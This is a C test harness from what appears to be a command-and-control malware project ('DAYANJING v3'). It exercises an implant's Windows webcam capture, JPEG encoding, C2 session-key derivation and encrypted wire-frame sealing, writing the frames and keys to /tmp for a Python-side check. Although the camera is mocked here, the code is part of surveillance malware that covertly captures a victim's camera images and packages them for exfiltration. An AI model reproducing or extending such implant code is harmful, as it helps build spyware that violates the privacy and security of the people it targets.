/*
 * DAYANJING v3 — e2e_capture.c
 *
 * 端到端联调：agent_windows 采集 -> JPEG -> C2 会话密钥 -> 帧层封装
 *
 * 链路：
 *   [agent_windows] mock 摄像头采集一帧
 *        -> cam_frame_to_jpeg（MJPEG 直通 / 转码）
 *   [02_c2]        c2_derive_session 派生 k_c2s
 *   [02_c2]        c2_frame_seal 封装成 wire 帧
 *        -> 落盘 /tmp/e2e_orig.jpg（原始 JPEG）
 *        -> 落盘 /tmp/e2e_wire.bin（wire 帧）
 *        -> 打印 k_c2s，供 Python 侧 frame.SealedEnvelope 验证
 *
 * Python 侧用同一把 k_c2s 解封，payload 必须与 JPEG 逐字节一致。
 */

#include "c2.h"
#include "c2_frame.h"
#include "camera.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- 与 Python 侧一致的固定输入 ---- */
#define HEX_MASTER "1112131415161718191a1b1c1d1e1f20"
#define HEX_TH     "ef84671ed6aa2386ff8189a690c30622a90c4233bcd1f8c0a3cbee406e187f71"
#define HEX_SID    "202122232425262728292a2b2c2d2e2f"
#define IMPLANT_ID "implant-alpha-01"
#define GENERATION 7u

#define MSG_TYPE_FRAME 0x10   /* 图像帧 */

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static size_t hex2bin(const char *h, uint8_t *out, size_t cap)
{
    size_t n = strlen(h), i;
    if (n % 2) return 0;
    for (i = 0; i < n / 2; i++) {
        int hi = hexval(h[i * 2]), lo = hexval(h[i * 2 + 1]);
        if (hi < 0 || lo < 0 || i >= cap) return 0;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return n / 2;
}

static int dump_file(const char *path, const uint8_t *d, size_t n)
{
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    if (n && fwrite(d, 1, n, f) != n) { fclose(f); return -1; }
    fclose(f);
    return 0;
}

int main(void)
{
    uint8_t master[16], th[32], sid[16], prefix[8];
    c2_session_keys_t sk;
    cam_source_t *src;
    cam_config_t cfg;
    cam_frame_t frame;
    uint8_t *jpg = NULL, *wire = NULL;
    size_t jlen = 0, wlen = 0, i;
    int rc = 1;

    hex2bin(HEX_MASTER, master, sizeof(master));
    hex2bin(HEX_TH, th, sizeof(th));
    hex2bin(HEX_SID, sid, sizeof(sid));
    for (i = 0; i < 8; i++) prefix[i] = (uint8_t)(0x50 + i);   /* 固定 nonce 前缀，便于复现 */

    printf("[*] e2e: agent_windows 采集 -> 02_c2 封装\n");

    /* ---------- 1. 采集一帧 ---------- */
    src = cam_source_create("mock");
    if (!src) { printf("  [FAIL] cam_source_create\n"); return 1; }

    memset(&cfg, 0, sizeof(cfg));
    cfg.width = 320; cfg.height = 240; cfg.fps = 15;
    cfg.capture_ms = 200; cfg.max_frames = 1; cfg.prefer_mjpeg = true;

    if (src->open(src, &cfg) != CAM_OK) {
        printf("  [FAIL] 采集源打开失败\n"); goto done;
    }
    if (src->capture(src, &frame) != CAM_OK) {
        printf("  [FAIL] 采集帧失败\n"); goto done;
    }
    printf("  [ ok ] 采集到一帧: fmt=%d %ux%u len=%zu\n",
           (int)frame.fmt, frame.width, frame.height, frame.len);

    /* ---------- 2. 转 JPEG ---------- */
    if (cam_frame_to_jpeg(&frame, NULL, &jlen, &jlen) != CAM_OK || jlen == 0) {
        printf("  [FAIL] JPEG 容量探测失败\n"); goto done;
    }
    jpg = (uint8_t *)malloc(jlen);
    if (!jpg) { printf("  [FAIL] 内存分配失败\n"); goto done; }
    if (cam_frame_to_jpeg(&frame, jpg, &jlen, &jlen) != CAM_OK) {
        printf("  [FAIL] JPEG 转码失败\n"); goto done;
    }
    printf("  [ ok ] JPEG 产物 %zu 字节 (SOI=%02x%02x EOI=%02x%02x)\n",
           jlen, jpg[0], jpg[1], jpg[jlen - 2], jpg[jlen - 1]);

    if (dump_file("/tmp/e2e_orig.jpg", jpg, jlen) != 0) {
        printf("  [FAIL] 写 /tmp/e2e_orig.jpg 失败\n"); goto done;
    }

    /* ---------- 3. 派生会话密钥 ---------- */
    if (c2_derive_session(master, th, sid, IMPLANT_ID, GENERATION, &sk) != C2_OK) {
        printf("  [FAIL] c2_derive_session 失败\n"); goto done;
    }

    /* ---------- 4. 帧层封装 ---------- */
    if (c2_frame_seal(sk.k_c2s, prefix, 0, 1, MSG_TYPE_FRAME, jpg, jlen,
                      NULL, 0, &wlen) != C2_FRAME_OK) {
        printf("  [FAIL] seal 容量探测失败\n"); goto done;
    }
    wire = (uint8_t *)malloc(wlen);
    if (!wire) { printf("  [FAIL] 内存分配失败\n"); goto done; }
    if (c2_frame_seal(sk.k_c2s, prefix, 0, 1, MSG_TYPE_FRAME, jpg, jlen,
                      wire, wlen, &wlen) != C2_FRAME_OK) {
        printf("  [FAIL] seal 封装失败\n"); goto done;
    }
    printf("  [ ok ] wire 帧 %zu 字节（payload %zu + 帧头开销 %d + Envelope 头 %d）\n",
           wlen, jlen, C2_FRAME_OVERHEAD, C2_ENVELOPE_HDR);

    if (dump_file("/tmp/e2e_wire.bin", wire, wlen) != 0) {
        printf("  [FAIL] 写 /tmp/e2e_wire.bin 失败\n"); goto done;
    }

    /* ---------- 5. 输出供 Python 侧验证 ---------- */
    {
        FILE *f = fopen("/tmp/e2e_keys.txt", "w");
        if (!f) { printf("  [FAIL] 写密钥文件失败\n"); goto done; }
        for (i = 0; i < 16; i++) fprintf(f, "%02x", sk.k_c2s[i]);
        fprintf(f, "\n");
        for (i = 0; i < 16; i++) fprintf(f, "%02x", sk.k_s2c[i]);
        fprintf(f, "\n");
        fclose(f);
    }
    printf("  [ ok ] k_c2s/k_s2c 已写入 /tmp/e2e_keys.txt\n");
    printf("[*] e2e: C 侧完成，等待 Python 侧解封验证\n");
    rc = 0;

done:
    if (src) { src->close(src); cam_source_destroy(src); }
    if (jpg)  free(jpg);
    if (wire) free(wire);
    return rc;
}
